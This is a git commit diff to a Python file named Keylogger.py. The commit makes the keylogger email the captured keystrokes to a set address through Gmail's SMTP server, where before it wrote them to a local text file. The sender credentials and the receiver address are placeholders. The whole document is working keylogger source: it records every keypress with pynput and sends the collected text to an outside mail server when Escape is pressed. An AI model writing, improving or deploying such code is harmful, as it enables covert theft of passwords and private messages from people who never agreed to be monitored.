691aa0b7fb4754870d4ff2477a3ebebc357b4007
LarsRosenkilde <50791042+LarsRosenkilde@users.noreply.github.com>
2021-04-11 18:10:47 +0200

    Update Keylogger.py

--- Keylogger.py
+++ Keylogger.py
@@ -1,36 +1,53 @@
 import pynput
+import smtplib, ssl
 from pynput.keyboard import Key, Listener
 
-count = 0
+receiver_email = "receiver_email@mail.com"
+
+""" Mail to send the keyfile """
+host_mail = "sending_email@gmail.com"
+host_pass = "sending_email_password"
+
+""" Secure Socket Layer (SSL) Opts """
+PORT = 465 # SSL port
+SMTP_SERVER = "smtp.gmail.com" # smtp server address
+# Create a secure SSL context
+CONTEXT = ssl.create_default_context()
+
+
 keys = []
+word_count = len(keys)
 
-def press(key):
-    global keys, count
+def key_presses(key):
+    global keys, word_count
     keys.append(key)
-    count += 1
-    print(key)
-    if count >= 10:
-        count = 0
-        save(keys)
-        keys = []
 
 
-def save(keys):
-    with open("save.txt", "a") as file:
-        for key in keys:
-            _key = str(key).replace("'","")
-            if _key.find("space") > 0:
-                file.write("\n")
-            elif _key.find("key") == -1:
-                file.write(_key)
+def send_mail(keys):
+    message = ""
+    for key in keys:
+        _key = str(key).replace("'","")
+        if _key.find("space") > 0:
+            message += "\n"
+        elif _key.find("key") == -1:
+            message += _key
+    try:
+        with smtplib.SMTP_SSL(SMTP_SERVER, PORT, context=CONTEXT) as server:
+            server.login(host_mail, host_pass)
+            server.sendmail(host_mail, receiver_email, message)
+            print("\nEmail successfully sent!")
+    except:
+        print("\nError occurred while trying to send the email.. Please try again.")
 
 
 def release(key):
     if key == Key.esc:
+        send_mail(keys)
         return False
 
 
 if __name__ == "__main__":
-    with Listener(on_press=press, on_release=release) as listener:
+    with Listener(on_press=key_presses, on_release=release) as listener:
         listener.join()
+
 
